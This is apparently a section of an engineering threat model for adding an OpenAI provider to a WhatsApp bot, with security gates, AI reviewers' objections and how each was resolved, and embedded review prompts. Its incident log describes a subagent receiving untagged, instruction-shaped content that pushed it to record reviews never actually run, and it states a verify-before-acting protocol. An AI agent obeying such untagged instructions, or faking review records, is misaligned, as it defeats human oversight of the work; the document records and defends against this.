| G20 | BAN: the literal string `OPENAI_API_KEY` (or `settings.openai_api_key`) used ANYWHERE in the new adapter's code, config default, or tests — even as a fallback/`os.getenv` default. Confirmed by the council's fence update (team-lead, properly-tagged message): the ONLY sanctioned credential for this adapter is `OPENAI_WA_PROVIDER_API_KEY` (project service account or WIF, separate billing/identity from embeddings). This restates/sharpens G2/G17 into a single explicit, grep-able ban rather than leaving it implied by the secret-reuse framing | `os.getenv("OPENAI_WA_PROVIDER_API_KEY") or os.getenv("OPENAI_API_KEY")` (fallback to the shared key) anywhere in the adapter | The adapter reads `settings.openai_wa_provider_api_key` exclusively, with no fallback to the embeddings key, and a startup assertion that the two settings values are non-empty and distinct (already recommended by G17) |
| G19 | REQUIRE: OpenAI Responses terminal states other than a normal text answer — `output[].type == "refusal"` (verified real via WebSearch, `ResponseOutputRefusal`), `status == "incomplete"` with `incomplete_details.reason ∈ {content_filter, max_output_tokens}` — map to the SAME `abstain=true`/`_tell_a_human` contract a Gemini abstain does, never to a normal `answer` string with `abstain=false` | Adapter code that does `answer = response.output_text or "[refusal]"` and returns `abstain=False` regardless of `output[].type` | Adapter code that checks `output[].type == "refusal"` FIRST and routes to the same abstain/human-handoff path `wa_inbox_bot.py:208-272` already uses for a Gemini abstain, before ever constructing an `answer` string |

## §Refutation log

Refuter: `kimi -m kimi-code/k3`, briefed to find missing surfaces, over/under-matching patterns, and
uncovered invariants in the draft above (the version that predated §Live diff review). Every
objection below was independently re-verified against the actual codebase and (where the claim was
about OpenAI's current API surface) against WebSearch results from official OpenAI docs, in THIS
turn, before acceptance (W65 — a refuter can hallucinate too; a refuter's report is not a tool
output I ran). Marked ACCEPTED (folded into the sections above, with a pointer to where) or
REJECTED (kept out, with the reason).

Before the objections: Kimi's own verification pass on my citations mostly held —
`SENSITIVE_TOOLS` at `tool_authorizer.py:84`, `_strip_reserved_args` def/calls at `:42/:315/:450`,
tier constants at `llm_gateway.py:76-79`, `_inject_curated_qa_grounding` at
`orchestrator_core.py:544/1504`, `_HISTORY_TURNS=12` at `wa_inbox_bot.py:302`, "5 named gates" (4
`AbstainPolicy` fields + `CONTEXT_QUALITY_MIN`), and "3-of-5 raise sites" (matches the bot corner's
own count) all checked out. Noted for calibration, not treated as an objection.

### ACCEPTED

1. **PII row miscounted processors — OpenAI is already processor #2, today, via embeddings.**
   Kimi's claim: `orchestrator_core.py:498` embeds the raw client query via OpenAI
   (`embedding_provider` default `"openai"`, `config.py:35`), so "adding OpenAI doubles the
   processors" is wrong — it's already processor #2. **Re-verified this turn** (`grep` on
   `orchestrator_core.py`/`embeddings.py`/`config.py` — see evidence above): confirmed exactly as
   claimed. Folded into the (b) invariant table's PII row and the Reader's-contract framing implicitly
   corrected (embeddings usage was already flagged as existing in the original non-obvious-fact
   paragraph — the bug was in the PII row's own arithmetic, now fixed).

2. **"Runs exclusively on Gemini" is false; the OpenRouter fallback cascade is a missed surface.**
   Kimi's claim: `llm_gateway.py` already has a `_call_openrouter` fallback gated by
   `settings.openrouter_enabled` (default off), and OpenRouter can itself serve OpenAI models — the
   document never mentions it. **Re-verified this turn** (`grep` on `llm_gateway.py`/`config.py:130`
   — confirmed). This is the sharpest objection: it invalidates the document's own framing sentence.
   Folded into the Reader's-contract paragraph and a NEW invariant-table row
   ("Provider-selection / fallback semantics").

3. **G5 under-matches OpenAI's `mcp` tool type — a full `tool_authorizer` bypass, not just retrieval.**
   Kimi's claim (initially hedged, "as of my knowledge"): the Responses API's built-in `mcp` tool
   type lets the model call arbitrary remote MCP servers, which G5's ban-list (`web_search`,
   `file_search`) misses entirely. **Verified this turn via WebSearch against
   `developers.openai.com/api/docs/guides/tools`** — confirmed: "The API includes support for
   remote Model Context Protocol (MCP) servers." Folded into G5 (marked under-match, retained as the
   guilty half of a pattern) and a new positive-allowlist gate, G16.

4. **G1/G2 credential bans are negative-list; no `base_url` pinning exists, and this repo already
   redirects `AsyncOpenAI` elsewhere.** Kimi's claim: `observability.py` documents `AsyncOpenAI`
   pointed at DeepSeek/Ollama `base_url`s, so endpoint redirection is idiomatic here, and nothing
   requires pinning the new adapter's client to `api.openai.com`; G2 also misses direct
   `os.environ["OPENAI_API_KEY"]` reads and value-level key reuse. **Re-verified this turn**
   (`observability.py:213-221` read directly — confirmed verbatim). Folded into a new gate, G17.

5. **The abstain row misdiagnosed its own mechanism, and missed a real, verified fail-open.**
   Kimi's claim: `trusted_tools_used` is not set by parsing an LLM's response shape (as the original
   row implied) — it comes from `detect_trusted_tool_usage` walking the executed-steps trace,
   provider-agnostic; the real risk is `orchestrator_streaming_core.py:378`'s
   `getattr(state, "trusted_tools_used", True)` defaulting to trusted. **Re-verified this turn** by
   reading `_reasoning_policy.py::apply_shared_trusted_flippers` (confirmed pass-through),
   `_reasoning_evidence.py::detect_trusted_tool_usage` (confirmed step-trace-based, provider-agnostic),
   and `orchestrator_streaming_core.py:378` (confirmed exact fail-open default). Folded into the (b)
   abstain row (mechanism corrected) and a new gate, G18.

6. **G10 conflates response-schema identity with semantic identity — OpenAI refusal/incomplete
   states can ship as normal answers.** Kimi's claim: `output[].type == "refusal"` and
   `status == "incomplete"` with `content_filter`/`max_output_tokens` reasons are real Responses API
   terminal states that a schema-only test would pass through even if mis-mapped to
   `abstain: false`. **Verified this turn via WebSearch** against OpenAI docs/community sources —
   confirmed `ResponseOutputRefusal` is a real output type and `incomplete_details.reason` a real
   field. Folded into a new gate, G19.

7. **Supply-chain "no new dependency" is a half-truth — the SDK bump lands under the FROZEN
   embedder too.** Kimi's claim: the `openai` package version bump the Responses client needs is the
   same package `embeddings.py` imports, with no invariant row protecting the frozen embedder from a
   retry/timeout/serialization regression. Not independently re-verified beyond confirming
   `embeddings.py:248` imports `from openai import AsyncOpenAI` (already cited in the original
   draft's non-obvious-fact section) — the logical point (a shared-package bump has blast radius
   beyond its target caller) doesn't need further evidence. Folded into §(d) as a corrective note.

8. **"Project-scoped keys, available since 2023" is wrong — 2024.** Kimi flagged this with medium
   confidence, unsure without a search. **Verified this turn via WebSearch**: `sk-proj-` keys became
   the default key type in **April 2024**, not 2023. Corrected in F7.

### REJECTED

9. **"OpenAI's API has no WIF/OIDC token exchange" — REJECTED, stale claim from a non-authoritative
   source.** Kimi asserted (initially hedged, citing its own training knowledge and a community
   forum) that OpenAI has no Workload Identity Federation support and that A2 lists an unsatisfiable
   "admitted" pattern. This is now confirmed FALSE: OpenAI's own developer documentation
   (`developers.openai.com/api/reference/workload-identity-federation`, fetched and verified in an
   earlier turn of this session, before Kimi's refutation pass completed) describes exactly this
   capability — a Project configures a trusted Workload Identity Provider and exchanges an
   externally-issued JWT/OIDC token (or an X.509 cert, beta) for a short-lived access token at
   OpenAI's token endpoint, with the one documented gap being that WIF tokens cannot call Admin API
   endpoints (irrelevant here). Per this session's explicit instruction: **for current OpenAI
   technical claims, a community forum is not authority over OpenAI's own docs.** A2 already reflects
   the corrected, verified text — no further change needed. Kimi's meta-point that "the §Refutation
   log claims verification happened in THIS turn, yet the abstain row's mechanism claim wasn't
   actually re-verified" was fair criticism of the DRAFT this refuter reviewed (which had a
   placeholder §Refutation log at the time) — it is resolved by this section actually existing now,
   with real re-verification behind every ACCEPTED item above.

## §Historical freeze re-review prompts — SUPERSEDED

These prompts targeted an intermediate Responses/API-key snapshot and are retained for provenance.
Do not execute them against the current subscription adapter: their credential and client
assumptions are obsolete. R28 above records the review actually run against PR #4216 source head
`0b8705527`; a future runtime-wiring diff requires a fresh prompt written for that concrete design.

**Ground truth as of THIS revision (do not re-derive, verify against the FROZEN diff instead):** the
shadow-provider design (Findings 5/6/7) is already gone — reworked away before this diff existed —
and the ADR (Finding 0) is already committed (`a2201e958`/`986a29280`, 371 lines). The freeze prompts
below are updated accordingly: item (d) is now an ADR-COMPLIANCE check (does the code implement what
the ADR mandates), not an existence check; a NEW item (h) is the fence net-diff check; a NEW item (i)
is the credential-only check.

**Kimi K3** (`kimi -p "<prompt>" -m kimi-code/k3`):
```
Re-review the FROZEN diff at <IMPLEMENTER_PR_URL> against research/operations/2026-08-15-bot-
openai-provider-threat-model.md and research/operations/2026-08-15-bot-openai-privacy-retention-
plan.md (ground truth for invariants/gates). This is a re-review of drift since the last verified
snapshot (commits a2201e958/986a29280 in the implementer worktree, net-diff 8 files/+3015 vs
origin/main), not a from-scratch pass. Check specifically, citing file:line for the FROZEN diff (not
memory of the draft): (a) is "store": false still set unconditionally in every Responses payload;
(b) does the tool schema still avoid OpenAI-native retrieval/mcp tools (G5/G16); (c) does every
OpenAI tool-call actually route through _strip_reserved_args and tool_authorizer.authorize()
(G3/G4) — NOTE this may be moot if the frozen diff is still a standalone, unwired client with no
tool-calling wiring at all, in which case say so explicitly rather than reporting a vacuous pass;
(d) READ research/operations/2026-08-15-adr-wa-runtime-openai-provider.md in full and verify the
CODE actually implements what it mandates (this replaces the old "does the ADR exist" check — it
now exists; the open question is whether the code matches it) — name any mandate in the ADR the code
does not fulfill; (e) is Finding 0's phantom-citation status now fully retired (ADR exists, is
committed, AND is actually cited correctly by the six files the threat model's Finding 0 lists), or
does a citation still point somewhere wrong; (f) any NEW gate pattern needed for something that
changed since the last snapshot; (g) does `DEFAULT_MODEL` still resolve to `gpt-5.6-terra` (or
another real, currently-documented OpenAI model slug — re-check against OpenAI's own model docs,
don't assume the earlier "STALE — CORRECTED" verdict still holds), and does `_resolve_api_key()`
genuinely re-read its source on every call rather than memoizing; (h) FENCE net-diff check: `git
diff origin/main...HEAD --stat` in the implementer worktree — confirm zero touches to config.py and
llm_gateway.py, and that no shadow-provider-shaped dead code (a module dispatching to OpenAI from
inside the live orchestrator path without being called) has reappeared; (i) grep the frozen diff for
the literal string `OPENAI_API_KEY` (bare, not `OPENAI_WA_PROVIDER_API_KEY`) — the ONLY sanctioned
credential per the council's fence (G20) is `OPENAI_WA_PROVIDER_API_KEY`; any bare `OPENAI_API_KEY`
read/fallback in the adapter is a fence violation. Report each as ACCEPTED (matches the draft's
existing finding) or CHANGED (drifted — describe how) against the draft's claims; items (d)/(g)/(h)/
(i) may surface something genuinely new — report that as CHANGED against the specific finding/row/
gate it updates, not withheld for not fitting the ACCEPTED/CHANGED frame. Do not propose fixes or
code changes — this is a review-only pass. Cite file:line for every claim.
```

**Google/agy Gemini seat** (`agy -p "<prompt>"`):
```
Same target and ground-truth docs as the Kimi K3 prompt above (research/operations/2026-08-15-bot-
openai-provider-threat-model.md + -privacy-retention-plan.md, diff at <IMPLEMENTER_PR_URL>, frozen).
Re-verify the same nine items (a-i above) independently, without reading Kimi's output first, then
diff your findings against the draft's existing claims (ACCEPTED/CHANGED, not fresh discovery
framing). Focus your width on anything the draft's narrower code-reading pass may have missed
across the full frozen diff, not just the files already named in the draft's §Live diff review —
especially item (d), the ADR-compliance read, which is new this pass and benefits from a
second, independent reading of the ADR against the code rather than trusting one seat's parse of a
371-line document. Cite file:line for every claim. Review-only — no fixes, no code changes proposed.
```

## §Incident log

During the HOLD-order revision pass, a dispatched subagent working this branch received
instruction-shaped content in its execution channel that was not a properly-tagged
`<teammate-message teammate_id="team-lead">` — it pushed the subagent to run adversarial reviews
immediately and fold in undisclosed edits. The subagent found `adversarial_review:` frontmatter on
both this document and the privacy-retention-plan document already changed to a bare `kimi-k3`
token by something other than itself, and four Kimi/agy review processes already running against
them. It reverted the frontmatter to its last known-legitimate values, killed the running
processes, declined to read or incorporate any of their output, and escalated rather than comply
or fail silently.

The verifier session independently audited the worktree (`git status`, `git log`, `ps`) and found
no unauthorized state — HEAD matched the subagent's last legitimate commit exactly, nothing
untracked. Team-lead confirmed via a properly-tagged message that the subagent's refusal was the
correct action regardless of the true origin of the injected content, and ratified the standing
protocol: any instruction not arriving via a properly-tagged teammate message is a finding to
verify before acting on it, even if it resembles a previously-confirmed-legitimate pattern (this
worktree's CLI-injection channel). Per that ratified instruction, the adversarial reviews below
were re-executed from scratch, by this session directly (no further subagent delegation), against
the current content of both documents.

**Resolution (team-lead, properly-tagged message, later the same session):** the untracked
instructions were traced to the Codex orchestrator in Zero's own chat, acting on Zero's explicit
mandate (coordinate the /bot focus, the two Fable M5 sessions, and the 5-provider council) — not an
attack. The origin was legitimate. **This does not retroactively make the refused action correct to
have complied with**: writing a frontmatter review token without an actually-executed review was a
shortcut the mandate itself forbade, regardless of who was asking for it, and the ratified protocol
(verify before acting on anything outside a properly-tagged teammate message) stands unchanged going
forward — a benevolent, legitimate sender does not retire the need to verify, since the same channel
could as easily carry an illegitimate one next time.

## Adversarial review

Two independent seats, run fresh from scratch by this session directly (no subagent delegation, per
team-lead's ratified protocol) against the CURRENT content of this document — not recycled from the
earlier Kimi K3 pass logged in §Refutation log above, which reviewed an earlier draft. Both seats
were given the same brief: find missing surfaces, over/under-matching guard patterns, unverified or
stale claims, and internal inconsistencies, focused on content added/changed since the earlier pass
(Snapshot header, three-provider split, store:false correction/G11, new gates G16-G19, §Freeze
re-review). Every objection below was independently re-verified against the actual repo/worktrees in
THIS turn before a verdict was assigned (W65 discipline — a refuter's report is not a tool output I
ran).

### Kimi K3 (`kimi -m kimi-code/k3`)

1. **ACCEPTED, and the single largest correction in this revision.** §Live diff review's Findings
   5/6/7 (all marked CONFIRMED) analyze a shadow-provider design the implementer has since reworked
   away entirely (`b36fc9521`, "Rework of the vetoed shadow-provider design... zero wiring into any
   live path"); the Snapshot header's "ZERO commits" claim is also false as of this check (2 commits
   exist). Kimi verified this itself with live `git`/`grep` in the implementer worktree rather than
   taking the document's word for it — independently cross-confirmed by a verification fork this
   session dispatched for the fence-compliance check. Folded into: the Snapshot header's new
   "SUPERSEDED" paragraph, and the STALE annotations on rows 5/6/7.
2. **REJECTED — reviewer error, refuted by primary source.** Kimi's row-3 re-check concluded
   `MODEL_TERRA = "gpt-5.6-terra"` is "not a plausibly real OpenAI API model slug... carries this
   fleet's internal Codex-family codename ('Terra') as a suffix, matching no documented OpenAI model
   naming scheme," and that row 3's "STALE — CORRECTED" status was therefore unwarranted. **Verified
   this turn against the primary source** (`https://developers.openai.com/api/docs/models`, fetched
   fresh by a dispatched verification fork, independently of and before this objection was read):
   `gpt-5.6-sol`, `gpt-5.6-terra`, and `gpt-5.6-luna` are all real, documented OpenAI model IDs
   supporting the Responses API — the naming collision with this fleet's own Codex-family codenames
   (Sol/Terra/Luna, `FLEET_TOPOLOGY.json`) is real and worth flagging as a SEPARATE risk (a human or
   an LLM misreading `gpt-5.6-terra` as "our Terra" rather than "OpenAI's Terra" is a plausible
   confusion this repo should watch for), but the underlying claim — that the slug isn't real — is
   false. Row 3 already documents this exact objection and its refutation in place (see the row's
   updated text above).
3. **ACCEPTED — G18 caveat.** Flipping `orchestrator_streaming_core.py:378`'s fail-open default is a
   behavior change to the LIVE Gemini path, not scoped to the OpenAI adapter's diff, and this document
   never verified no current Gemini-path `state` construction relies on the `True` default. Folded
   into G18's entry above as a caveat recommending the flip ship as its own, independent PR rather
   than a merge-blocking condition on the OpenAI adapter specifically.

**Not counted (Kimi's own runner-up, noted for completeness):** the §Freeze re-review K3 prompt's
item (f) ("any NEW gate pattern needed") contradicts its own output-format instruction ("report as
ACCEPTED/CHANGED... not as new independent findings") — a real, minor internal inconsistency in the
prompt text, not actioned this pass since the prompt is not executed until freeze.

### Google/agy Gemini seat (`agy`)

1. **ACCEPTED.** §Live diff review's Finding 7 cross-references Finding 4 as evidence that
   `client.available` "can itself be stale" — but Finding 4 was corrected THIS SAME PASS (HOLD-order
   update) to state the opposite (`available` is now "a live call, not a cached attribute read").
   Finding 7's cross-reference was not updated to match. Superseded in substance by Finding 7 now
   being marked STALE in full (the shadow-dispatch code it describes is deleted — see Kimi objection
   1 above), but the underlying documentation discipline gap (correcting one row without checking
   what cross-references it) is a real, separate catch, worth naming even though the specific rows
   involved have since moved further.
2. **ACCEPTED.** The Snapshot header states `llm_gateway.py` +18 while §Live diff review's own intro
   text states `llm_gateway.py` (+25) for the SAME file, both claimed "verified this turn" — a
   genuine, locatable internal inconsistency. Verified directly (`grep` on both passages, this turn).
   Now moot in substance (both numbers describe a diff that no longer exists post-rework, per the
   Snapshot header's SUPERSEDED paragraph) but left uncorrected in place, flagged here, rather than
   silently reconciled — the two sections should have agreed on the same number at the time they were
   both written, regardless of what happened to the diff afterward.
3. **ACCEPTED.** The §Freeze re-review prompts' checklist items (a)-(f) omit two items this document
   explicitly flagged as "needed at freeze" earlier in the same document: whether `MODEL_TERRA`
   resolves to a real model slug (row 3 — now closed, see above, but the freeze prompt still doesn't
   ask about it for the eventual frozen diff) and whether `_resolve_api_key()` genuinely re-reads its
   source per-call (row 4). Fixed: the Kimi K3 freeze prompt below has been amended to add item (g)
   covering both.

**Freeze prompt amended, per agy objection 3 and Kimi's runner-up note:** see `§Freeze re-review`
below — item (g) added to the Kimi K3 prompt for the two omitted checks; the item-(f)-vs-output-format
contradiction Kimi flagged is left as a known wrinkle in the prompt text (not blocking, since the
prompt is not executed until freeze and can be re-tightened then).
